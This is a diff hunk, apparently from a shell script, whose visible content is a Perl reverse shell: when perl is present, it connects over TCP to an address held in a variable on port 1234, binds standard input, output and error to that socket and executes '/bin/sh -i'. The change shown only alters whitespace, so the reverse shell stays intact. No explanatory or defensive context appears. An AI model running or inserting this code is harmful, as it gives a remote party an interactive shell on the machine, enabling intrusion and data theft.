@@ -21,7 +21,7 @@ if command -v perl > /dev/null 2>&1; then
                       $p=1234; 
                       socket(S,PF_INET,SOCK_STREAM,GETPROTOBYNAME("tcp"));
 		  if(connect(S,sockaddr_in($p,inet_aton($i))))
-		  {      open(STDIN,">&S");
+		  {     open(STDIN,">&S");
 			open(STDOUT,">&S");
 			open(STDERR,">&S");
 			exec("/bin/sh -i");
